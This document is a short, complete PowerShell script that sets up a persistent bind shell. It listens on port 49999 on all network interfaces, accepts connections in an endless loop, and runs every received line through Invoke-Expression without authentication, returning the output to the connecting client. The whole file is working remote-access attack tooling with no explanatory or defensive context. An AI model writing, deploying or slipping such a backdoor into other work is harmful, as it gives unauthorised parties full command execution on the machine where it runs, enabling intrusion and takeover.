$port = 49999
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $port)
$listener.Start()
Write-Output "Persistent bind shell listening on port $port..."

while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    $writer.WriteLine("Connected to persistent shell on port $port`n")

    try {
        while ($client.Connected) {
            $writer.Write("PS> ")
            $cmd = $reader.ReadLine()
            if ($cmd -eq $null) { break }  # Handle disconnect cleanly
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
            } catch {
                $writer.WriteLine($_.Exception.Message)
            }
        }
    } catch {
        $writer.WriteLine("Client disconnected.")
    }

    $client.Close()
}
